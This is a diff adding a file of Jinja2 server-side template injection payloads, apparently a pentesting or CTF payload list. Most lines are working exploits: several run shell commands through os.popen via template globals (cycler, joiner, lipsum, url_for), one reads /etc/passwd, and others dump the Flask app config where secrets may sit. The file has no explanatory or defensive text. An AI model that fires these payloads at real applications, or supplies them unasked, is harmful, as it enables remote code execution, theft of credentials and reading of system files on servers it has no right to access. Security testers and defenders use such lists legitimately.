@@ -1,0 +1,21 @@
+# Jinja2 SSTI Payloads
+{{7*7}}
+{{7*'7'}}
+{{config}}
+{{config.items()}}
+{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}
+{{''.__class__.__mro__[1].__subclasses__()}}
+{{''.__class__.__bases__[0].__subclasses__()}}
+{{request.application.__self__._get_data_for_json.__globals__['json'].JSONEncoder.default.__init__.__globals__['current_app'].config}}
+{{cycler.__init__.__globals__.os.popen('id').read()}}
+{{joiner.__init__.__globals__.os.popen('id').read()}}
+{{namespace.__init__.__globals__.os.popen('id').read()}}
+{%for x in ().__class__.__base__.__subclasses__()%}{%if"warning"in x.__name__%}{{x()._module.__builtins__['__import__']('os').popen('id').read()}}{%endif%}{%endfor%}
+{{lipsum.__globals__["os"].popen('id').read()}}
+{{lipsum.__globals__.os.popen('id').read()}}
+{{request.__class__.__mro__[1].__subclasses__()}}
+{{().__class__.__bases__[0].__subclasses__()[40]('/etc/passwd').read()}}
+{{url_for.__globals__['__builtins__']['__import__']('os').popen('id').read()}}
+{{get_flashed_messages.__globals__['__builtins__'].__import__('os').popen('id').read()}}
+{% debug %}
+{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}}
